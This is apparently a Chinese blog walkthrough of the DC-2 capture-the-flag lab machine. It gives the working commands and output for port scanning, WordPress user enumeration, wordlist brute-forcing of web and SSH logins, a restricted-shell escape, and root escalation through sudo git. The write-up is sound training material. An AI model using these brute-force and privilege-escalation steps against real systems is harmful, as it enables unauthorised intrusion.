---
 title: DC-2靶机渗透实战
 date: 2020-02-04 19:12:33
 tags: 靶机渗透
 categories: 靶机渗透
---
### 靶机介绍

这次的靶机渗透实战是一个找寻靶机中的flag的过程，并以获得最终的flag为目标。
靶机下载地址:http://www.five86.com/dc-2.html

### 信息搜集
直接上nmap进行扫描
> nmap -sV -A 172.16.0.12
```
Nmap scan report for localhost (172.16.0.12)
Host is up (0.0011s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:0C:29:B7:BA:FE (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.07 ms localhost (172.16.0.12)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.58 seconds
```
发现开了80端口却无法访问，是重定向到dc-2域名，可改hosts文件访问，添加ip对应域名

win10路径： C:\Windows\System32\drivers\etc\hosts

linux路径： etc/hosts
<!--more-->

### 渗透实战
1. 查看页面为wordpress的cms且页面有flag提示
![2020-2-4-20-21-44](https://raw.githubusercontent.com/bbkali/picbad/master/2020-2-4-20-21-44)
- 用cewl来做字典
- 且登录进去才有可以拿到下一个flag
2. 果断用wpscan列出用户
> wpscan --url http://dc-2 -e u
```
admin
tom
jerry
```
3. 用cewl生成字典
> cewl http://dc-2 -w passwds.txt
4. 用wpscan进行用户爆破
> wpscan --url http://dc-2 -U users.txt -P passwds.tx
```
[i] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
```
5. 通过jerry用户登录后台发现flag2,提示走别的切入点
![2020-2-4-20-35-23](https://raw.githubusercontent.com/bbkali/picbad/master/2020-2-4-20-35-23)
6. 再扫描一下端口发现7744 ssh服务
> nmap -sV -p- dc-2 
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-04 20:36 CST
Nmap scan report for dc-2 (172.16.0.12)
Host is up (0.00047s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
MAC Address: 00:0C:29:B7:BA:FE (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.01 seconds
```
7. 尝试hydra爆破ssh
> hydra -L users.txt  -P passwds.txt dc-2 -s 7744 ssh -vV
```
[7744][ssh] host: dc-2   login: tom   password: parturient
```
- 登录ssh
> ssh tom@dc-2 -p 7744
```
tom@DC-2:~$ whoami
-rbash: whoami: command not found
tom@DC-2:~$ pwd
/home/tom
tom@DC-2:~$ ls
flag3.txt  usr
tom@DC-2:~$ cat flag3.txt
-rbash: cat: command not found
```
- 发现是一个受限的bash,直接bash绕过获取到flag3.txt内容
```
tom@DC-2:~$ BASH_CMDS[a]=/bin/sh;a
$ export PATH=$PATH:/bin/
$ export PATH=$PATH:/usr/bin
$ ls
flag3.txt  usr
$ cat flag3.txt
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
```
- 提示su切换jerry，使用之前后台爆破出来的密码成功登录
```
jerry@DC-2:~$ cat flag4.txt 
Good to see that you've made it this far - but you're not home yet. 

You still need to get the final flag (the only flag that really counts!!!).  

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!
```
- 提示最终的home，应该是要提权了，且是利用git
> find / -perm -u=s -type f 2>/dev/null
发现没有find和git命令,通过sudo查看发现jerry用户无需root密码可以执行git
> sudo -l
```
jerry@DC-2:/home$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
```
8. git提权
```
sudo git -p help
!/bin/sh
```
- 直接root权限获取最终finalflag
```
ls
final-flag.txt
# cat final-flag.txt
 __    __     _ _       _                    _ 
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.
```

